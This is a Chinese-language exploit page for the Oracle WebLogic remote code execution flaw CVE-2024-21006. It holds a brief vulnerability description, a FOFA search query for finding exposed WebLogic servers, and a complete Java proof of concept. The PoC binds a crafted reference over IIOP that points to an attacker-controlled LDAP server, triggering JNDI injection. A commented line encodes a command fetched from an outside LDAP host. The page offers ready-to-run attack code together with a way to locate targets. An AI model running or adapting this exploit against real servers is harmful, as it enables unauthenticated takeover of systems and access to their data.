# WebLogic远程代码执行漏洞(CVE-2024-21006)

Oracle WebLogic Server 产品中存在漏洞。受影响的受支持版本为 12.2.1.4.0 和 14.1.1.0.0。易于利用的漏洞允许未经身份验证的攻击者通过 T3、IIOP 进行网络访问来破坏 Oracle WebLogic Server。成功攻击此漏洞可能会导致对关键数据的未经授权的访问或对所有 Oracle WebLogic Server 可访问数据的完全访问

## fofa

```yaml
(body="Welcome to WebLogic Server") || (title=="Error 404--Not Found") || (((body="
BEA WebLogic Server" || server="Weblogic" || body="content=\"WebLogic Server" || body="
Welcome to Weblogic Application" || body="
BEA WebLogic Server") && header!="couchdb" && header!="boa" && header!="RouterOS" && header!="X-Generator: Drupal") || (banner="Weblogic" && banner!="couchdb" && banner!="drupal" && banner!=" Apache,Tomcat,Jboss" && banner!="ReeCam IP Camera" && banner!="
Blog Comments
")) || (port="7001" && protocol=="weblogic")
```

## poc

```java
package org.example;

import weblogic.j2ee.descriptor.InjectionTargetBean;
import weblogic.j2ee.descriptor.MessageDestinationRefBean;

import javax.naming.*;
import java.util.Hashtable;

public class MessageDestinationReference {

    public static void main(String[] args) throws Exception {
        String ip = "192.168.31.69";
        String port = "7001";
//        String rmiurl = "ldap://192.168.0.103/cVLtcNoHML/Plain/Exec/eyJjbWQiOiJ0b3VjaCAvdG1wL3N1Y2Nlc3MxMjMifQ==";
        String rhost = String.format("iiop://%s:%s", ip, port);

        Hashtable<String, String> env = new Hashtable<String, String>();
        // add wlsserver/server/lib/weblogic.jar to classpath,else will error.
        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        env.put(Context.PROVIDER_URL, rhost);
        Context context = new InitialContext(env);
//        Reference reference = new Reference("weblogic.application.naming.MessageDestinationObjectFactory","weblogic.application.naming.MessageDestinationObjectFactory","");
        weblogic.application.naming.MessageDestinationReference messageDestinationReference=new weblogic.application.naming.MessageDestinationReference(null, new MessageDestinationRefBean() {
            @Override
            public String[] getDescriptions() {
                return new String[0];
            }

            @Override
            public void addDescription(String s) {

            }

            @Override
            public void removeDescription(String s) {

            }

            @Override
            public void setDescriptions(String[] strings) {

            }

            @Override
            public String getMessageDestinationRefName() {
                return null;
            }

            @Override
            public void setMessageDestinationRefName(String s) {

            }

            @Override
            public String getMessageDestinationType() {
                return "weblogic.application.naming.MessageDestinationReference";
            }

            @Override
            public void setMessageDestinationType(String s) {

            }

            @Override
            public String getMessageDestinationUsage() {
                return null;
            }

            @Override
            public void setMessageDestinationUsage(String s) {

            }

            @Override
            public String getMessageDestinationLink() {
                return null;
            }

            @Override
            public void setMessageDestinationLink(String s) {

            }

            @Override
            public String getMappedName() {
                return null;
            }

            @Override
            public void setMappedName(String s) {

            }

            @Override
            public InjectionTargetBean[] getInjectionTargets() {
                return new InjectionTargetBean[0];
            }

            @Override
            public InjectionTargetBean createInjectionTarget() {
                return null;
            }

            @Override
            public void destroyInjectionTarget(InjectionTargetBean injectionTargetBean) {

            }

            @Override
            public String getLookupName() {
                return null;
            }

            @Override
            public void setLookupName(String s) {

            }

            @Override
            public String getId() {
                return null;
            }

            @Override
            public void setId(String s) {

            }
        }, "ldap://127.0.0.1:1389/deserialJackson", null, null);

        context.bind("L0ne1y",messageDestinationReference);
        context.lookup("L0ne1y");
    }
}
```



## 漏洞来源

- https://mp.weixin.qq.com/s/r2hVjX_liGblvfm8RZuNDQ